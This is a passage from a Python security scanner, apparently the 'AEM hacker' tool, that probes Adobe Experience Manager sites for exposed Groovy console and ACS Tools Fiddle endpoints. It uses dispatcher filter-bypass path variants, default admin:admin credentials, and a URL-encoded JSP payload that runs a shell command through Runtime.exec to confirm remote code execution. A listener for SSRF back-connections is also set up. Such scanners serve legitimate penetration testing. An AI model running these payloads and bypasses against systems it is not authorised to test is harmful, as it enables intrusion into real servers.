    )
    GROOVYSCRIPT2 = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYSCRIPT2)

    GROOVYAUDIT = itertools.product(
        ('/bin/groovyconsole/audit.servlet', '///bin///groovyconsole///audit.servlet'),
        ('', '.css', '.js', '.html', '.ico', '.png', '.json', '.1.json', '.4.2.1...json', ';%0aa.css', ';%0aa.html',
         ';%0aa.js', ';%0aa.ico', ';%0aa.png')
    )
    GROOVYAUDIT = list('{0}{1}'.format(p1, p2) for p1, p2 in GROOVYAUDIT)

    results = []
    for path in itertools.chain(GROOVYSCRIPT1, GROOVYSCRIPT2):
        url = normalize_url(base_url, path)
        data = 'script={}'.format(SCRIPT)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url}
        try:
            resp = http_request(url, 'POST', data=data, additional_headers=headers, proxy=proxy)

            f = Finding('GroovyConsole', url, 'Groovy console is exposed, RCE is possible. '
                                              'See - https://github.com/OlsonDigital/aem-groovy-console')

            if resp.status_code == 200:
                if 'executionResult' in str(resp.content):
                    results.append(f)
                    break

                try:
                    json.loads(resp.content.decode())['output']
                except:
                    pass
                else:
                    results.append(f)
                    break

        except:
            if debug:
                error('Exception while performing a check', check='exposed_groovy_console', url=url)

    for path in GROOVYAUDIT:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
                    json.loads(resp.content.decode())['data']
                except:
                    pass
                else:
                    f = Finding('GroovyConsole', url, 'Groovy console is exposed. '
                                                      'See - https://github.com/OlsonDigital/aem-groovy-console')

                    results.append(f)
                    break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_groovy_console', url=url)

    return results


@register
def exposed_acs_tools(base_url, my_host, debug=False, proxy=None):
    DATA = 'scriptdata=%0A%3C%25%40+page+import%3D%22java.io.*%22+%25%3E%0A%3C%25+%0A%09Process+proc+%3D+Runtime.getRuntime().exec(%22echo+abcdef31337%22)%3B%0A%09%0A%09BufferedReader+stdInput+%3D+new+BufferedReader(new+InputStreamReader(proc.getInputStream()))%3B%0A%09StringBuilder+sb+%3D+new+StringBuilder()%3B%0A%09String+s+%3D+null%3B%0A%09while+((s+%3D+stdInput.readLine())+!%3D+null)+%7B%0A%09%09sb.append(s+%2B+%22%5C%5C%5C%5Cn%22)%3B%0A%09%7D%0A%09%0A%09String+output+%3D+sb.toString()%3B%0A%25%3E%0A%3C%25%3Doutput+%25%3E&scriptext=jsp&resource='

    FIDDLE = itertools.product(
        ('/etc/acs-tools/aem-fiddle/_jcr_content.run.html', '/etc/acs-tools/aem-fiddle/_jcr_content.run.4.2.1...html'),
        ('', '/a.css', '/a.js', '/a.ico', '/a.png', '/a.json', '/a.1.json', '/a.4.2.1...json', '?a.css', '?a.gif',
         '?a.js', '?a.ico', '?a.png')
    )
    FIDDLE = list('{0}{1}'.format(p1, p2) for p1, p2 in FIDDLE)

    PREDICATES = ('/bin/acs-tools/qe/predicates.json',)

    results = []
    for path in FIDDLE:
        url = normalize_url(base_url, path)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': base_url,  'Authorization': 'Basic YWRtaW46YWRtaW4='}
        try:
            resp = http_request(url, 'POST', data=DATA, additional_headers=headers, proxy=proxy)

            if resp.status_code == 200 and 'abcdef31337' in str(resp.content):
                f = Finding('ACSTools', url, 'ACS Tools Fiddle is exposed, RCE is possible. '
                                             'See - https://adobe-consulting-services.github.io/acs-aem-tools/')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_acs_tools', url=url)

    for path in PREDICATES:
        url = normalize_url(base_url, path)
        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200 and 'relativedaterange' in str(resp.content):
                f = Finding('ACSTools', url, 'ACS Tools predicates. '
                                             'See - https://adobe-consulting-services.github.io/acs-aem-tools/')

                results.append(f)
                break
        except:
            if debug:
                error('Exception while performing a check', check='exposed_acs_tools', url=url)

    return results


def parse_args():
    parser = argparse.ArgumentParser(description='AEM hacker by @0ang3el, see the slides - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps')

    parser.add_argument('-u', '--url', help='url to scan')
    parser.add_argument('--proxy', help='http and https proxy')
    parser.add_argument('--debug', action='store_true', help='debug output')
    parser.add_argument('--host', help='hostname or IP to use for back connections during SSRF detection')
    parser.add_argument('--port', type=int, default=80, help='opens port for SSRF detection')
    parser.add_argument('--workers', type=int, default=3, help='number of parallel workers')

    return parser.parse_args(sys.argv[1:])


def run_detector(port):  # Run SSRF detector in separate thread
    global token, d

    handler = lambda *args: Detector(token, d, *args)
    httpd = HTTPServer(('', port), handler)

    t = Thread(target=httpd.serve_forever)
    t.start()

    return httpd


def main():
    args = parse_args()

    if args.proxy:
        p = args.proxy
        proxy = {'http': p, 'https': p}
    else:
        proxy = {}

    if not args.url:
        print('You must specify the -u parameter, bye.')
        sys.exit(1337)

    if not args.host:
        print('You must specify the --host parameter, bye.')
        sys.exit(1337)

    if not preflight(args.url, proxy):
        print('Seems that you provided bad URL. Try another one, bye.')
        sys.exit(1337)

    httpd = run_detector(args.port)

    with concurrent.futures.ThreadPoolExecutor(args.workers) as tpe:
        futures = []
        for check in registered:
            my_host = '{0}:{1}'.format(args.host, args.port)
            futures.append(tpe.submit(check, args.url, my_host, args.debug, proxy))

        for future in concurrent.futures.as_completed(futures):
            for finding in future.result():
                print('[+] New Finding!!!')
                print('\tName: {}'.format(finding.name))
                print('\tUrl: {}'.format(finding.url))
                print('\tDescription: {}\n\n'.format(finding.description))

    httpd.shutdown()


if __name__ == '__main__':
    main()
